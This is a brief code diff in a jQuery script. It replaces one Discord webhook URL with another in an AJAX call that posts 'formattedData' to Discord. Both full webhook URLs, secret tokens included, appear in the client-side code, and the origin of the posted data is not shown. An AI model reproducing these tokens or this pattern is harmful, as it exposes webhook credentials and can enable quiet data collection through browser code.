@@ -22,7 +22,7 @@ $(document).ready(function() {
 
       $.ajax({
           type: "POST",
-          url: "https://discord.com/api/webhooks/1398817472768901222/aZLGLJRjaiiN0AURCrZFWLn1odEHxfHRjJ94dK2HENTVEV5oHJlctGceNC4CyHO-EyIu",
+          url: "https://discord.com/api/webhooks/1398844687254556692/HiJSe76CgIkriR7m-3JCf_YbeIvrmkTUHJ-Imf__IDhX5wzfLQWR904yD9FckP-f6Rd6",
           data: JSON.stringify({ content: formattedData }),
           contentType: "application/json"
       });
